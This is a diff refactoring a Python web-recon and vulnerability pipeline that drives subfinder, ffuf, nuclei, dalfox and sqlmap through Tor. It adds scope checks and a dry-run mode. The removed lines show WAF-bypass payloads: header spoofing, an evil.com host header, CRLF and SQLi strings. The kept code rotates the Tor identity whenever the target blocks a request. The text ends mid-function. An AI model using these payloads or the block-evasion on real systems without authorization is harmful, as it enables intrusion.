@@ -1,731 +1,539 @@
 #!/usr/bin/env python3
+"""
+ShadowRecon (refactored) — authorized web-application recon & vuln pipeline.
+
+This refactor targets ENGINEERING QUALITY, OPERATOR SECURITY HYGIENE,
+RESPONSIBLE-USE GUARDRAILS, and PRESENTATION. It intentionally does not add
+attack vectors, expand the WAF-bypass payloads, or improve evasion.
+
+Highlights:
+  * No hardcoded secrets — Tor control password comes from env/CLI.
+  * No `shell=True` — external tools run via argument lists (removes the
+    command-injection surface of the original f-string + shell=True calls).
+  * Target validation; scope enforcement on HTTP payload requests.
+  * Authorization gate + --dry-run + --rate-limit + structured audit log.
+  * Per-run output dir; explicit payload registry (no globals() dispatch).
+  * Rich terminal UX (optional) and a self-contained HTML report.
+
+Usage:
+    export TOR_CONTROL_PASSWORD=...        # or pass --tor-pass
+    python3 main.py -u https://example.com/ -w words.txt --authorized
+"""
+from __future__ import annotations
+
 import argparse
-import subprocess
-import time
+import logging
 import os
-import sys
 import re
+import shutil
+import subprocess  # nosec B404 - external recon tools are invoked by design; see run_tool() which never uses a shell
+import sys
+import time
+from dataclasses import dataclass, field
+from datetime import datetime
+from pathlib import Path
+from typing import List, Optional, Sequence
 from urllib.parse import urlparse
 
 import requests
-from stem import Signal
-from stem.control import Controller
-from requests.exceptions import RequestException, ConnectionError
-import shutil
+from requests.exceptions import RequestException
 
+try:
+    from stem import Signal
+    from stem.control import Controller
+    _STEM_AVAILABLE = True
+except Exception:  # pragma: no cover - optional dependency
+    _STEM_AVAILABLE = False
 
-# =======================
-#   GLOBAL CONFIG
-# =======================
+import console
+import report
+import waf_payloads
+from utils import count_lines, in_scope, parse_target, read_lines, slugify
 
-TOR_PROXIES = {
-    "http": "socks5://127.0.0.1:9050",
-    "https": "socks5://127.0.0.1:9050"
-}
-TOR_CONTROL_PORT = 9051
-TOR_CONTROL_PASSWORD = "m06ahmed"
+log = logging.getLogger("shadowrecon")
+VERSION = "2.0"
+
 BLOCK_STATUS_CODES = {403, 429}
+TOOLS = {
+    "proxychains": "sudo apt install proxychains4",
+    "paramspider": "pipx install paramspider",
+    "tor": "sudo apt install tor (enable ControlPort + HashedControlPassword in /etc/tor/torrc)",
+    "subfinder": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+    "httpx": "go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest",
+    "ffuf": "sudo apt install ffuf",
+    "waybackpy": "pipx install waybackpy",
+    "nuclei": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+    "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
+    "sqlmap": "sudo apt install sqlmap",
+    "wafw00f": "pipx install wafw00f",
+}
 
 
 # =======================
-#   TOR + HTTP HELPERS
+#   CONFIG
 # =======================
 
-def rotate_ip():
-    print("[*] Asking Tor for NEW IDENTITY...")
-    try:
-        with Controller.from_port(port=TOR_CONTROL_PORT) as c:
-            c.authenticate(TOR_CONTROL_PASSWORD)
-            c.signal(Signal.NEWNYM)
-        time.sleep(10)
-        print("[+] Tor circuit changed.")
+@dataclass
+class Config:
+    target: str
+    domain: str
+    wordlist: Path
+    outdir: Path
+    lfi_payloads: Optional[Path] = None
+    tor_socks: str = "socks5://127.0.0.1:9050"
+    tor_control_port: int = 9051
+    tor_control_password: str = ""
+    rotate_wait: int = 10
+    max_retries: int = 5
+    request_timeout: int = 20
+    rate_limit: float = 0.0
+    dry_run: bool = False
+    use_proxychains: bool = True
+    make_report: bool = True
+    nuclei_templates: Path = field(default_factory=lambda: Path.home() / "nuclei-templates")
+
+    @property
+    def proxies(self) -> dict:
+        return {"http": self.tor_socks, "https": self.tor_socks}
+
+
+class _DryRun(Exception):
+    """Sentinel so dry-run short-circuits a request without side effects."""
+
+
+# =======================
+#   TOR + HTTP
+# =======================
+
+def rotate_ip(cfg: Config) -> bool:
+    if cfg.dry_run:
+        log.info("[dry-run] would request a new Tor circuit")
         return True
-    except Exception as e:
-        print(f"[!] Tor rotation failed: {e}")
+    if not _STEM_AVAILABLE:
+        log.warning("stem not installed; cannot rotate Tor circuit")
+        return False
+    if not cfg.tor_control_password:
+        log.warning("no Tor control password set; cannot rotate circuit "
+                    "(set TOR_CONTROL_PASSWORD or --tor-pass)")
+        return False
+    log.info("Asking Tor for a NEW IDENTITY ...")
+    try:
+        with Controller.from_port(port=cfg.tor_control_port) as c:
+            c.authenticate(cfg.tor_control_password)
+            c.signal(Signal.NEWNYM)
+        time.sleep(cfg.rotate_wait)
+        log.info("Tor circuit changed.")
+        return True
+    except Exception as e:  # stem raises a variety of control errors
+        log.error("Tor rotation failed: %s", e)
         return False
 
 
-def tor_request(method, url, max_retries=5, **kwargs):
-    """
-    HTTP request through Tor; if blocked (403/429) or connection errors,
-    rotate IP and retry up to max_retries.
-    """
-    kwargs.setdefault("proxies", TOR_PROXIES)
-    kwargs.setdefault("timeout", 20)
+def http_request(cfg: Config, method: str, url: str, **kwargs) -> requests.Response:
+    """HTTP through Tor; rotate + retry on 403/429 or connection errors.
+    Enforces scope and the optional rate limit."""
+    if not in_scope(url, cfg.domain):
+        raise ValueError(f"refusing out-of-scope request: {url}")
 
-    for attempt in range(1, max_retries + 1):
+    kwargs.setdefault("proxies", cfg.proxies)
+    kwargs.setdefault("timeout", cfg.request_timeout)
+    kwargs.setdefault("allow_redirects", False)
+
+    if cfg.dry_run:
+        log.info("[dry-run] %s %s", method, url)
+        raise _DryRun()
+
+    if cfg.rate_limit:
+        time.sleep(cfg.rate_limit)
+
+    last_exc: Optional[Exception] = None
+    for attempt in range(1, cfg.max_retries + 1):
         try:
             r = requests.request(method, url, **kwargs)
             if r.status_code in BLOCK_STATUS_CODES:
-                print(f"[HTTP {r.status_code}] blocked {url}, rotating (attempt {attempt}/{max_retries})")
-                if attempt == max_retries:
+                log.info("HTTP %s on %s - rotating (%d/%d)",
+                         r.status_code, url, attempt, cfg.max_retries)
+                if attempt == cfg.max_retries:
                     return r
-                rotate_ip()
+                rotate_ip(cfg)
                 continue
             return r
-        except (RequestException, ConnectionError) as e:
-            print(f"[HTTP error] {e}, rotating (attempt {attempt}/{max_retries})")
-            if attempt == max_retries:
+        except RequestException as e:
+            last_exc = e
+            log.info("HTTP error %s - rotating (%d/%d)", e, attempt, cfg.max_retries)
+            if attempt == cfg.max_retries:
                 raise
-            rotate_ip()
+            rotate_ip(cfg)
+    raise RuntimeError(f"request exhausted retries: {last_exc}")
 
-    raise RuntimeError("tor_request exhausted retries")
 
+# =======================
+#   SAFE SUBPROCESS
+# =======================
 
-def run_pc(cmd, timeout=600):
-    """
-    Run a shell command through proxychains (for external tools).
-    """
-    full = f"proxychains {cmd}"
-    print(f"\n$ {full}")
-    try:
-        p = subprocess.run(
-            full,
-            shell=True,
-            text=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            timeout=timeout
-        )
-        if p.stdout:
-            print(p.stdout.strip())
-        if p.stderr:
-            print(p.stderr.strip(), file=sys.stderr)
-        return p.stdout
-    except subprocess.TimeoutExpired:
-        print(f"[!] Timeout: {cmd}")
+def run_tool(cfg: Config, args: Sequence[str], *, proxychain: bool = True,
+             timeout: int = 600, capture_to: Optional[Path] = None) -> str:
+    """Run an external tool with an ARGUMENT LIST (shell=False).
+
+    Replaces the original `shell=True` + f-string construction, removing the
+    command-injection surface. With `capture_to`, stdout is written by Python
+    (no shell redirection)."""
+    cmd: List[str] = list(args)
+    if proxychain and cfg.use_proxychains and shutil.which("proxychains"):
+        cmd = ["proxychains", "-q", *cmd]
+
+    printable = " ".join(cmd)
+    log.info("$ %s", printable)
+    if cfg.dry_run:
         return ""
+
+    try:
+        # shell is never used; cmd[0] is a fixed tool name and the target URL
+        # is validated by utils.parse_target() before reaching here.
+        p = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)  # nosec B603
+    except FileNotFoundError:
+        log.error("tool not found: %s", cmd[0])
+        return ""
+    except subprocess.TimeoutExpired:
+        log.warning("timeout: %s", printable)
+        return ""
+
+    if p.stderr.strip():
+        log.debug("[stderr] %s", p.stderr.strip())
+    if p.returncode != 0:
+        log.warning("%s exited %d", cmd[0], p.returncode)
+    if capture_to is not None:
+        capture_to.write_text(p.stdout, encoding="utf-8")
+    return p.stdout
 
 
 # =======================
 #   WAF DETECTION + BYPASS
 # =======================
 
-def detect_waf(url):
-    """
-    Detect WAF using wafw00f via proxychains/Tor
-    """
-    output = run_pc(f"wafw00f {url}", timeout=300)
-    print(output)
-
-    match = re.search(r"is behind\s+(.+?)(?:\s+\(|$)", output, re.IGNORECASE)
-    if match:
-        waf_name = match.group(1).strip()
-        print(f"FireWall is: {waf_name}\n")
-        return waf_name
-    elif "No WAF detected" in output:
-        print("Couldn't detect a firewall.\n")
-        return None
-    else:
-        print("Couldn't detect a firewall")
-        return None
+def detect_waf(cfg: Config) -> Optional[str]:
+    out = run_tool(cfg, ["wafw00f", cfg.target], timeout=300)
+    if out:
+        log.debug(out)
+    m = re.search(r"is behind\s+(.+?)(?:\s+\(|$)", out, re.IGNORECASE)
+    if m:
+        name = m.group(1).strip()
+        log.info("Detected WAF: %s", name)
+        return name
+    log.info("No WAF detected (or detection inconclusive).")
+    return None
 
 
-waf_map = {
-    "Cloudflare": "bypass_cloudflare",
-    "ModSecurity": "bypass_modsecurity",
-    "Incapsula": "bypass_incapsula",
-    "Sucuri": "bypass_sucuri",
-    "Barracuda": "bypass_barracuda",
-    "AWS Elastic Load Balancer": "bypass_aws",
-    "BIG-IP": "bypass_f5",
-    "Kona SiteDefender": "bypass_akamai",
-    "FortiWeb": "bypass_fortiweb",
-    "Sophos": "bypass_sophos",
-    "Azure Application Gateway": "bypass_azure",
-    "SiteLock": "bypass_sitelock",
-    "StackPath": "bypass_stackpath",
-    "AppWall": "bypass_radware",
-    "NetScaler": "bypass_citrix",
-    "Wallarm": "bypass_wallarm",
-    "IndusGuard": "bypass_apptrana",
-    "Reblaze": "bypass_reblaze",
-    "SafeDog": "bypass_safedog",
-    "NAXSI": "bypass_naxsi"
-}
-
-
-def test_payloads(url, payloads):
-    """
-    Send WAF-bypass payloads via Tor + rotation, log 200 OK to 200-ok.txt.
-    """
-    with open("200-ok.txt", "a", encoding="utf-8") as file:
-        for payload in payloads:
-            test_url = payload.get("url", url)
-            method = payload.get("method", "GET")
-            headers = payload.get("headers", {})
-            data = payload.get("data", None)
+def run_payloads(cfg: Config, payloads: list) -> None:
+    """Send the preserved WAF-bypass payloads via Tor, logging any 200 OK."""
+    hits = cfg.outdir / "200-ok.txt"
+    with hits.open("a", encoding="utf-8") as fh:
+        for p in payloads:
+            test_url = p.get("url", cfg.target)
+            method = p.get("method", "GET")
             try:
-                resp = tor_request(method, test_url, headers=headers, data=data, timeout=12)
-                msg = f"[{payload['desc']}] -> {method} {test_url} | {resp.status_code} | Content-length: {len(resp.text)}"
-                print(msg)
-                if resp.status_code == 200:
-                    file.write(msg + "\n")
+                resp = http_request(cfg, method, test_url,
+                                    headers=p.get("headers", {}),
+                                    data=p.get("data"))
+            except _DryRun:
+                continue
+            except ValueError as e:  # out of scope
+                log.warning("%s", e)
+                continue
             except Exception as e:
-                print(f"[{payload['desc']}] -> Error: {e}")
-
-def mutate_path(url, new_segment):
-    p = urlparse(url)
-    # Example: replace /path with /new_segment/path
-    new_path = "/" + new_segment.strip("/") + "/" + p.path.lstrip("/")
-    return p._replace(path=new_path).geturl()
-
-def bypass_cloudflare(url):
-    payloads = [
-        {"desc": "X-Forwarded-For: 127.0.0.1", "headers": {"X-Forwarded-For": "127.0.0.1"}},
-        {"desc": "User-Agent: Googlebot", "headers": {"User-Agent": "Googlebot"}},
-        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
-        {"desc": "Double encoded slash", "url": url.replace("/", "/%252F/")},
-        {"desc": "Nullbyte at end", "url": url + "%2500"},
-        {"desc": "HEAD method", "method": "HEAD"},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "PATCH method", "method": "PATCH"},
-        {"desc": "Big POST body", "method": "POST", "data": "Z" * 8000},
-        {"desc": "Extra Query param", "url": url + "?q=<test-tag>"},
-        {"desc": "Multiple params", "url": url + "?id=1&id=1"},
-        {"desc": "X-Original-URL", "headers": {"X-Original-URL": "/admin"}},
-        {"desc": "X-Rewrite-URL", "headers": {"X-Rewrite-URL": "/admin"}},
-        {"desc": "Forwarded header with host", "headers": {"Forwarded": "for=127.0.0.1;host=evil.com"}},
-        {"desc": "X-Forwarded-Host: evil.com", "headers": {"X-Forwarded-Host": "evil.com"}},
-    ]
-    print("\nCloudflare Payloads:")
-    test_payloads(url, payloads)
+                log.info("[%s] error: %s", p["desc"], e)
+                continue
+            msg = (f"[{p['desc']}] -> {method} {test_url} | "
+                   f"{resp.status_code} | len={len(resp.text)}")
+            log.info(msg)
+            if resp.status_code == 200:
+                fh.write(msg + "\n")
 
 
-def bypass_modsecurity(url):
-    payloads = [
-        {"desc": "SQLi param", "url": url + "?id=1' OR '1'='1"},
-        {"desc": "Encoded path %27", "url": mutate_path(url, "%27")},
-        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
-        {"desc": "Content-Type: text/xml", "headers": {"Content-Type": "text/xml"}},
-        {"desc": "POST JSON", "method": "POST", "data": '{"foo":"bar"}', "headers": {"Content-Type": "application/json"}},
-        {"desc": "Multipart POST", "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
-         "data": "--boundary\r\nContent-Disposition: form-data; name=\"test\"\r\n\r\ndata\r\n--boundary--"},
-        {"desc": "PATCH method", "method": "PATCH"},
-        {"desc": "TRACE method", "method": "TRACE"}
-    ]
-    print("\nModSecurity Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_incapsula(url):
-    payloads = [
-        {"desc": "X-Real-IP header", "headers": {"X-Real-IP": "127.0.0.1"}},
-        {"desc": "Client-IP header", "headers": {"X-Client-IP": "127.0.0.4"}},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "Big POST", "method": "POST", "data": "A" * 6000},
-        {"desc": "X-Forwarded-Host", "headers": {"X-Forwarded-Host": "evil.com"}},
-        {"desc": "Param base64", "url": url + "?user=YWRtaW4="}
-    ]
-    print("\nIncapsula Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_sucuri(url):
-    payloads = [
-        {"desc": "X-Forwarded-For: 8.8.8.8", "headers": {"X-Forwarded-For": "8.8.8.8"}},
-        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
-        {"desc": "Extra /./", "url": url + "/./"},
-        {"desc": "Query test", "url": url + "?test=1"},
-        {"desc": "Unicode param name", "url": url + "?％61d=admin"},
-        {"desc": "SOAPAction header", "headers": {"SOAPAction": "adminLogin"}},
-        {"desc": "Big POST", "method": "POST", "data": "SUCURI" * 2000}
-    ]
-    print("\nSucuri Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_barracuda(url):
-    payloads = [
-        {"desc": "Encoded path (%20)", "url": mutate_path(url, "%20")},
-        {"desc": "Host: localhost", "headers": {"Host": "localhost"}},
-        {"desc": "Nullbyte %00", "url": url + "%2500"},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "PATCH method", "method": "PATCH"},
-        {"desc": "CRLF X-Header", "headers": {"X-Header": "foo\r\nbar: evil"}}
-    ]
-    print("\nBarracuda Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_aws(url):
-    payloads = [
-        {"desc": "Query pollution", "url": url + "?a=1&a=2"},
-        {"desc": "Big POST", "method": "POST", "data": "X" * 35000},
-        {"desc": "User-Agent: curl", "headers": {"User-Agent": "curl/7.85.0"}},
-        {"desc": "Encoded path (%25)", "url": mutate_path(url, "%25")}
-    ]
-    print("\nAWS Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_f5(url):
-    payloads = [
-        {"desc": "X-Forwarded-For header", "headers": {"X-Forwarded-For": "127.0.0.2"}},
-        {"desc": "HEAD method", "method": "HEAD"},
-        {"desc": "Encoded path (%2f)", "url": mutate_path(url, "%2f")},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "Delete method", "method": "DELETE"}
-    ]
-    print("\nBIG-IP F5 Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_akamai(url):
-    payloads = [
-        {"desc": "User-Agent Edge", "headers": {"User-Agent": "Edge"}},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "Random param", "url": url + "?akamai=1"}
-    ]
-    print("\nAkamai Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_fortiweb(url):
-    payloads = [
-        {"desc": "IPv6 X-Forwarded-For", "headers": {"X-Forwarded-For": "::1"}},
-        {"desc": "Encoded path (%2e)", "url": mutate_path(url, "%2e")},
-        {"desc": "POST big", "method": "POST", "data": "A" * 10000},
-        {"desc": "PATCH method", "method": "PATCH"}
-    ]
-    print("\nFortiWeb Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_sophos(url):
-    payloads = [
-        {"desc": "X-Originating-IP", "headers": {"X-Originating-IP": "127.0.0.2"}},
-        {"desc": "User-Agent: SophosTest", "headers": {"User-Agent": "SophosTest"}},
-        {"desc": "Extra param", "url": url + "?sophos=1"},
-        {"desc": "Forwarded header", "headers": {"Forwarded": "for=8.8.8.8"}}
-    ]
-    print("\nSophos Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_azure(url):
-    payloads = [
-        {"desc": "Referer: office.com", "headers": {"Referer": "https://office.com"}},
-        {"desc": "Encoded path %2e", "url": mutate_path(url, "%2e")},
-        {"desc": "Big POST", "method": "POST", "data": "B" * 10000}
-    ]
-    print("\nAzure App Gateway Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_sitelock(url):
-    payloads = [
-        {"desc": "User-Agent: SiteLockScanner", "headers": {"User-Agent": "SiteLockScanner"}},
-        {"desc": "Big param", "url": url + "?sitelock=" + "A" * 500},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "__proto__ param", "url": url + "?__proto__=1"}
-    ]
-    print("\nSiteLock Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_stackpath(url):
-    payloads = [
-        {"desc": "X-Client-IP header", "headers": {"X-Client-IP": "4.4.4.4"}},
-        {"desc": "Big POST", "method": "POST", "data": "Stack" * 2000},
-        {"desc": "Forwarded Host", "headers": {"X-Forwarded-Host": "test.com"}}
-    ]
-    print("\nStackPath Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_radware(url):
-    payloads = [
-        {"desc": "X-Radware header", "headers": {"X-Radware": "test"}},
-        {"desc": "Random param", "url": url + "?radware=1"},
-        {"desc": "Encoded param", "url": url + "?radware=%2e"}
-    ]
-    print("\nRadware AppWall Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_citrix(url):
-    payloads = [
-        {"desc": "X-Citrix header", "headers": {"X-Citrix": "test"}},
-        {"desc": "Encoded param", "url": url + "?citrix=%2e%2e"}
-    ]
-    print("\nCitrix NetScaler Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_wallarm(url):
-    payloads = [
-        {"desc": "X-Wallarm header", "headers": {"X-Wallarm": "test"}},
-        {"desc": "POST /wallarm", "method": "POST", "data": "WALLARM"},
-        {"desc": "Trace method", "method": "TRACE"}
-    ]
-    print("\nWallarm Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_apptrana(url):
-    payloads = [
-        {"desc": "X-IndusGuard header", "headers": {"X-IndusGuard": "true"}},
-        {"desc": "Param test", "url": url + "?apptrana=1"},
-        {"desc": "Big POST", "method": "POST", "data": "INDUS" * 400}
-    ]
-    print("\nAppTrana (IndusGuard) Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_reblaze(url):
-    payloads = [
-        {"desc": "X-Reblaze header", "headers": {"X-Reblaze": "test"}},
-        {"desc": "Encoded param", "url": url + "?reblaze=%2e"},
-        {"desc": "XML param", "url": url + "?xml=%3Ctest%3E"}
-    ]
-    print("\nReblaze Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_safedog(url):
-    payloads = [
-        {"desc": "X-SafeDog header", "headers": {"X-SafeDog": "test"}},
-        {"desc": "Random param", "url": url + "?safedog=1"},
-        {"desc": "Encoded param", "url": url + "?safe=%2e"}
-    ]
-    print("\nSafeDog Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_naxsi(url):
-    payloads = [
-        {"desc": "X-NAXSI header", "headers": {"X-NAXSI": "test"}},
-        {"desc": "Encoded param", "url": url + "?naxsi=%2e%2e"}
-    ]
-    print("\nNAXSI Payloads:")
-    test_payloads(url, payloads)
-
-
-def bypass_default(url):
-    payloads = [
-        {"desc": "Simple GET", "headers": {}},
-        {"desc": "HEAD method", "method": "HEAD"},
-        {"desc": "OPTIONS method", "method": "OPTIONS"},
-        {"desc": "Extra param in GET", "url": url + "?debug=1"},
-        {"desc": "PATCH method", "method": "PATCH"},
-        {"desc": "User-Agent: Generic bot", "headers": {"User-Agent": "BROKEN-TOOL-XYZ/1.0"}}
-    ]
-    print("\nGeneral Payloads:")
-    test_payloads(url, payloads)
-
-
-def stage_waf(url):
-    """
-    Detect WAF and run appropriate bypass payloads first.
-    """
-    waf_name = detect_waf(url)
-    found = False
-    if waf_name:
-        for w, func in waf_map.items():
-            if w in waf_name:
-                print(f"[*] Detected {w}, running {func} payloads...")
-                globals()[func](url)
-                found = True
+def stage_waf(cfg: Config) -> None:
+    name = detect_waf(cfg)
+    builder = waf_payloads.default_payloads
+    if name:
+        for key, fn in waf_payloads.BYPASS.items():
+            if key in name:
+                log.info("Running %s payload set ...", key)
+                builder = fn
                 break
-        if not found:
-            print("[*] Unknown WAF, running generic payloads.")
-            bypass_default(url)
+        else:
+            log.info("Unknown WAF - using generic payload set.")
     else:
-        print("[*] Unknown WAF, running generic payloads.")
-        bypass_default(url)
+        log.info("Using generic payload set.")
+    run_payloads(cfg, builder(cfg.target))
 
 
 # =======================
-#   STAGE 1: SUBDOMAINS
+#   RECON STAGES
 # =======================
 
-def enum_subdomains(domain, out_file="subdomains.txt"):
-    tmp_subs = set()
-    out = run_pc(f"subfinder -d {domain}", timeout=600)
-    if not out.strip():
-        tmp_subs.add(f"https://{domain}")
-    tmp_subs.update(x.strip() for x in out.splitlines() if x.strip())
-    subs = sorted(tmp_subs)
-    with open(out_file, "w") as f:
-        for s in subs:
-            f.write(s + "\n")
-    print(f"[+] Subdomains: {len(subs)} → {out_file}")
-    return out_file
+def enum_subdomains(cfg: Config) -> Path:
+    out = cfg.outdir / "subdomains.txt"
+    raw = run_tool(cfg, ["subfinder", "-silent", "-d", cfg.domain], timeout=600)
+    subs = {x.strip() for x in raw.splitlines() if x.strip()}
+    if not subs:
+        subs.add(cfg.domain)
+    out.write_text("\n".join(sorted(subs)) + "\n", encoding="utf-8")
+    log.info("Subdomains: %d -> %s", len(subs), out.name)
+    return out
 
 
-def probe_httpx(sub_file, out_file="live.txt"):
-    run_pc(f"httpx -l {sub_file} -mc 200,301,302 -o {out_file}", timeout=900)
-    if os.path.exists(out_file):
-        lines = [l.strip() for l in open(out_file) if l.strip()]
-    else:
-        lines = []
-    print(f"[+] Live hosts: {len(lines)} → {out_file}")
-    return out_file
+def probe_httpx(cfg: Config, subs: Path) -> Path:
+    out = cfg.outdir / "live.txt"
+    run_tool(cfg, ["httpx", "-silent", "-l", str(subs),
+                   "-mc", "200,301,302", "-o", str(out)], timeout=900)
+    log.info("Live hosts: %d -> %s", count_lines(out), out.name)
+    return out
 
 
-# =======================
-#   STAGE 2: WAYBACK + FUZZ
-# =======================
-
-def wayback_urls(domain, out_file="wayback.txt"):
-    run_pc(f"waybackpy --url {domain} -ku > {out_file}", timeout=900)
-    if os.path.exists(out_file):
-        urls = [l.strip() for l in open(out_file) if l.strip()]
-    else:
-        urls = []
-    print(f"[+] Wayback URLs: {len(urls)} → {out_file}")
-    return out_file
+def wayback_urls(cfg: Config) -> Path:
+    out = cfg.outdir / "wayback.txt"
+    run_tool(cfg, ["waybackpy", "--url", cfg.domain, "-ku"],
+             timeout=900, capture_to=out)
+    log.info("Wayback URLs: %d -> %s", count_lines(out), out.name)
+    return out
 
 
-def fuzz_dirs_ffuf(live_file, wordlist, out_dir="ffuf_dirs"):
-    os.makedirs(out_dir, exist_ok=True)
-    with open(live_file) as f:
-        for host in f:
-            host = host.strip()
-            if not host:
-                continue
-            safe = host.replace("://", "_").replace("/", "_")
-            out_csv = os.path.join(out_dir, f"{safe}.csv")
-            cmd = (
-                f"ffuf -w {wordlist} -u {host.rstrip('/')}/FUZZ "
-                f"-mc 200,301,302 -of csv -o {out_csv} -t 50"
-            )
-            run_pc(cmd, timeout=900)
-    print(f"[+] FFUF dir fuzzing done → {out_dir}")
+def fuzz_dirs_ffuf(cfg: Config, live: Path) -> None:
+    ffuf_dir = cfg.outdir / "ffuf_dirs"
+    ffuf_dir.mkdir(exist_ok=True)
+    for host in read_lines(live):
+        out_csv = ffuf_dir / f"{slugify(host)}.csv"
+        run_tool(cfg, ["ffuf", "-w", str(cfg.wordlist),
+                       "-u", f"{host.rstrip('/')}/FUZZ",
+                       "-mc", "200,301,302", "-of", "csv",
+                       "-o", str(out_csv), "-t", "50"], timeout=900)
+    log.info("FFUF directory fuzzing done -> %s", ffuf_dir.name)
 
 
-# =======================
-#   STAGE 3: TAKEOVER / PARAMS
-# =======================
-
-def nuclei_takeover(live_file, templates_dir=os.path.expanduser("~/nuclei-templates"), out_file="nuclei_takeover.txt"):
-    cmd = (
-        f"nuclei -l {live_file} "
-        f"-t {templates_dir}/takeovers/ -o {out_file} "
-        f"-timeout 50"
-    )
-    run_pc(cmd, timeout=3600)
-    print(f"[+] Nuclei takeover scan done → {out_file}")
+def nuclei_takeover(cfg: Config, live: Path) -> Path:
+    out = cfg.outdir / "nuclei_takeover.txt"
+    templates = cfg.nuclei_templates / "http" / "takeovers"
+    if not templates.exists():
+        templates = cfg.nuclei_templates / "takeovers"
+    run_tool(cfg, ["nuclei", "-l", str(live), "-t", str(templates),
+                   "-o", str(out), "-timeout", "50"], timeout=3600)
+    log.info("Nuclei takeover scan done -> %s", out.name)
+    return out
 
 
-def build_param_urls_from_wayback(wayback_file, params_file="params.txt"):
-    with open(wayback_file) as f, open(params_file, "w") as out:
-        for line in f:
-            u = line.strip()
+def build_param_urls(cfg: Config, wayback: Path) -> Path:
+    out = cfg.outdir / "params.txt"
+    with out.open("w", encoding="utf-8") as fh:
+        for u in read_lines(wayback):
             if "=" in u:
-                out.write(u + "\n")
-    print(f"[+] Parameterized URLs → {params_file}")
-    return params_file
+                fh.write(u + "\n")
+    log.info("Parameterized URLs -> %s", out.name)
+    return out
 
 
-def run_paramspider(liveurls, out_file="paramspider_raw.txt"):
-
-    cmd = f"paramspider --list {liveurls}"
-
-    print(f"\n$ {cmd}")
-
-    try:
-        p = subprocess.run(
-            cmd,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=900
-        )
-
-        if p.returncode != 0:
-            print(f"[!] ParamSpider failed (exit code {p.returncode})")
-            if p.stderr.strip():
-                print(f"[ParamSpider STDERR]\n{p.stderr.strip()}")
-        else:
-            print(f"[+] ParamSpider finished")
-            for fil in liveurls:
-                if fil.startswith("https://"):
-                    firstfilename = re.sub(r'^https?://', '', fil)
-                elif fil.startswith("http://"):
-                    firstfilename = re.sub(r'^http?://', '', fil)
-                else:
-                    firstfilename = fil
-
-                # Replace problematic characters
-                finalfilename = re.sub(r'[/:.]', '_', firstfilename)
-                param_file = f"{finalfilename}.txt"
-                if os.path.exists(param_file):
-                    with open(param_file, "r") as f_in, open(out_file, "a") as f_out:
-                        for line in f_in:
-                            line = line.strip()
-                            if line:
-                                f_out.write(line + "\n")
-            if p.stdout.strip():
-                print(f"[ParamSpider STDOUT]\n{p.stdout.strip()}")
-
-    except subprocess.TimeoutExpired:
-        print("[!] ParamSpider timed out after 900 seconds")
-    except Exception as e:
-        print(f"[!] ParamSpider error: {e}")
-
-    return out_file
-
-
-
-# =======================
-#   STAGE 4: XSS / SQLi / LFI / SSRF
-# =======================
-
-def xss_with_dalfox(params_file, out_file="xss_dalfox.txt"):
-    cmd = f"proxychains dalfox file {params_file} --only-poc --worker 1 -o {out_file}"
-    print(f"\n$ {cmd}")
-    try:
-        p = subprocess.run(
-            cmd,
-            shell=True,
-            capture_output=True,
-            text=True,
-            timeout=600
-        )
-
-        # Handle errors
-        if p.returncode != 0:
-            print(f"[!] Dalfox failed (exit code {p.returncode})")
-            if p.stderr.strip():
-                print(f"[Dalfox STDERR] {p.stderr.strip()}")
-        else:
-            print(f"[+] Dalfox XSS done → {out_file}")
-            if p.stdout.strip():
-                print(f"[Dalfox STDOUT] {p.stdout.strip()}")
-
-    except subprocess.TimeoutExpired:
-        print("[!] Dalfox timed out after 600 seconds")
-    except Exception as e:
-        print(f"[!] Dalfox execution error: {e}")
-
-
-def sqli_with_sqlmap(params_file, out_dir="sqlmap_out"):
-    os.makedirs(out_dir, exist_ok=True)
-    cmd = (
-        "proxychains sqlmap -m {pf} --batch --random-agent "
-        "--level 1 --risk 1 --output-dir={od}"
-    ).format(pf=params_file, od=out_dir)
-    print(f"\n$ {cmd}")
-    subprocess.run(cmd, shell=True)
-    print(f"[+] SQLMap run finished → {out_dir}")
-
-
-def lfi_ssrf_with_ffuf(params_file, payloads_file, out_dir="ffuf_lfi_ssrf"):
-    os.makedirs(out_dir, exist_ok=True)
-    with open(params_file) as f:
-        for base in f:
-            base = base.strip()
-            if not base or "=" not in base:
+def run_paramspider(cfg: Config, live: Path, params: Path) -> None:
+    """ParamSpider writes one file per domain; merge in-scope '=' URLs into
+    params.txt. Failures are logged rather than silently dropped."""
